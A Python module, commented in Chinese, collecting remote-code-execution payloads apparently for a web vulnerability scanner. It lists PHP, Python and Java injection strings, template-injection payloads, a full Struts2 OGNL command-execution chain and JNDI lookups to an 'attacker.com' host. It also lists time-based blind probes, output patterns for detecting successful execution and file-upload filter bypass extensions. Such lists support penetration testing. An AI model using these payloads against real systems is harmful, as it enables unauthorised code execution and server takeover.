"""
RCE Payload 集合
支持：PHP代码注入、Python代码注入、反序列化RCE、表达式注入
"""

from typing import List, Dict

# PHP代码注入payload
PHP_CODE_INJECTION_PAYLOADS: List[str] = [
    # 基础测试
    "phpinfo()",
    "${phpinfo()}",
    "<?php phpinfo(); ?>",
    "<?php echo 'RCE_TEST'; ?>",
    ";phpinfo();",
    "|phpinfo()",
    "`phpinfo()`",
    # 变量覆盖 + 代码执行
    "$a='phpinfo';$a();",
    "${${phpinfo()}}",
    "${${$a}}" + "&a=phpinfo",
    # preg_replace /e 修饰符（PHP < 7.0）
    "/.*/e",
    "preg_replace('/.*/e','phpinfo()','test')",
    # assert() 注入
    "assert(phpinfo())",
    "call_user_func('phpinfo')",
    "create_function('','phpinfo()')",
    # eval() 注入
    "eval('phpinfo();')",
    "eval(phpinfo())",
    # system() 族
    "system('id')",
    "exec('id')",
    "shell_exec('id')",
    "passthru('id')",
    "popen('id','r')",
    "proc_open('id',...)",
]

# Python代码注入payload
PYTHON_CODE_INJECTION_PAYLOADS: List[str] = [
    # 基础测试
    "__import__('os').system('id')",
    "__import__('os').popen('id').read()",
    "os.system('id')",
    "subprocess.Popen('id',shell=True)",
    'eval(\'__import__("os").system("id")\')',
    'exec(\'__import__("os").system("id")\')',
    # SSTI (Server-Side Template Injection)
    "{{7*7}}",
    "{{7*'7'}}",
    "{{config}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
    "{%import os%}{{os.popen('id').read()}}",
    # Jinja2 SSTI
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{config.__class__.__init__.__globals__}}",
    "{{request.application.__globals__.__builtins__}}",
    # Mako SSTI
    "${7*7}",
    "${self.module.cache.util.os.popen('id').read()}",
]

# Java表达式注入 (EL, OGNL, SpEL)
JAVA_EXPRESSION_PAYLOADS: List[str] = [
    # EL表达式
    "${applicationScope}",
    "${pageContext}",
    "${Runtime.getRuntime().exec('id')}",
    # OGNL (Struts2)
    "%{(#cmd='id')(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
    "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))"
    "(#p=new java.lang.ProcessBuilder(#cmds))"
    "(#p.redirectErrorStream(true))"
    "(#process=#p.start())"
    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
    "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
    "(#ros.flush())}",
    # SpEL (Spring)
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{new java.lang.ProcessBuilder('id').start()}",
    # JNDI注入
    "${jndi:ldap://attacker.com/exploit}",
    "${jndi:rmi://attacker.com/exploit}",
]

# 反序列化RCE指示符
DESERIALIZATION_INDICATORS: Dict[str, List[str]] = {
    # Java反序列化特征
    "java": [
        "java.lang.Runtime",
        "java.lang.ProcessBuilder",
        "org.apache.commons.collections",
        "org.apache.xalan",
        "com.sun.rowset.JdbcRowSetImpl",
        "javax.management.BadAttributeValueExpException",
        "java.util.PriorityQueue",
        "org.codehaus.groovy",
        "SpringAbstractCommandByFactory",
        "org.springframework.beans.factory.ObjectFactory",
        "ysoserial",
    ],
    # PHP反序列化特征
    "php": [
        "O:",  # PHP序列化对象
        "a:",  # PHP序列化数组
        "s:",  # PHP序列化字符串
        "i:",  # PHP序列化整数
        "b:",  # PHP序列化布尔
        "__wakeup",
        "__destruct",
        "__toString",
        "__call",
    ],
    # Python pickle特征
    "python": [
        "cos\\nsystem",
        "(S'id'",
        "R.",
        "__reduce__",
        "subprocess",
        "os.system",
    ],
}

# 时间盲测payload（用于无回显场景）
TIME_BASED_PAYLOADS: Dict[str, List[str]] = {
    "php": [
        "sleep(5)",
        "usleep(5000000)",
        "time_nanosleep(5,0)",
        ";sleep(5);",
        "|sleep(5)",
        "`sleep 5`",
    ],
    "python": [
        "import time;time.sleep(5)",
        "__import__('time').sleep(5)",
        "time.sleep(5)",
    ],
    "bash": [
        ";sleep 5;",
        "|sleep 5",
        "$(sleep 5)",
        "`sleep 5`",
        "&&sleep 5",
        "||sleep 5",
    ],
    "windows": [
        ";timeout 5;",
        "|timeout 5",
        "&&timeout 5",
        "||timeout 5",
    ],
}

# RCE成功标识（响应中的特征字符串）
RCE_SUCCESS_PATTERNS: Dict[str, List[str]] = [
    # Linux命令执行成功标识
    r"uid=\d+\(.*?\)\s+gid=\d+",  # id命令输出
    r"root:x:0:0:",  # /etc/passwd
    r"total \d+\s+\d{4}-\d{2}-\d{2}",  # ls -la输出
    r"drwx[rx-]{9}",  # 目录权限
    # Windows命令执行成功标识
    r"Volume Serial Number",
    r"Directory of [A-Z]:\\",
    r"<DIR>",
    # phpinfo()特征
    r"PHP Version \d+\.\d+\.\d+",
    r"phpinfo\(\)",
    r"Configuration",
    r"PHP Core",
    # 通用RCE测试标识
    r"RCE_TEST_[A-Z0-9]{16}",
]

# 文件上传绕过技巧
UPLOAD_BYPASS_EXTENSIONS: List[str] = [
    # 双扩展名
    ".php.jpg",
    ".php.png",
    ".phtml.jpg",
    # 大小写混合
    ".pHp",
    ".PhP5",
    ".pHp5",
    # 空字节截断（旧版PHP）
    ".php%00.jpg",
    ".php\x00.jpg",
    # 其他可执行扩展名
    ".phtml",
    ".php5",
    ".php4",
    ".php3",
    ".php7",
    ".phar",
    ".inc",
    ".cfm",
    ".asp",
    ".aspx",
    ".jsp",
    ".jspx",
    ".war",
]

# Content-Type绕过
CONTENT_TYPE_BYPASS: List[str] = [
    "image/jpeg",
    "image/png",
    "image/gif",
    "text/plain",
    "application/octet-stream",
]

# 所有payload集合
ALL_RCE_PAYLOADS = {
    "php_code": PHP_CODE_INJECTION_PAYLOADS,
    "python_code": PYTHON_CODE_INJECTION_PAYLOADS,
    "java_expr": JAVA_EXPRESSION_PAYLOADS,
}
